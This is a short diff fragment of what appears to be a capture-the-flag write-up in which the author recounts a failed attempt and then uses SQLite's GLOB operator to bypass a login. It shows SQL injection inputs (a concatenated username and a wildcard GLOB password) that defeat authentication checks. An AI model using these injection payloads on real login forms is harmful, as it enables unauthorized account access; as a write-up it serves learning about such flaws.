@@ -1,5 +1,6 @@
 <img width="1919" height="595" alt="Screenshot_2025-09-29_23-48-46" src="https://github.com/user-attachments/assets/5e79fd1f-7918-4d0f-b570-ea5f2df04a3b" />
 I failed with that payload and kinda cluless at that time. But I found that the operator `GLOB` would be useful to exploit this site
+
 ```
 username: adm'||'in
 password: ' GLOB '*
